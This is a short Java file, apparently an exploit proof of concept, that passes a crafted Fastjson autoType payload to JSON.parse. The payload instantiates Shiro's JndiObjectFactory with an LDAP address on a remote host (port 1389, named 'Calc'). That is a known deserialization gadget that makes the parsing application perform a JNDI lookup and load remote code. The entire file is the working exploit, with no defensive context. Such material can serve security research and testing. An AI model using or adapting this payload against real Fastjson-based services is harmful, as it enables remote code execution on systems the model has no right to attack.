package FastJson;

import com.alibaba.fastjson.JSON;

public class Test68 {
    public static void main(String[] args) {
        String s = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.80.1:1389/Calc\"}";
        Object obj = JSON.parse(s);
        System.out.println(obj);
    }
}
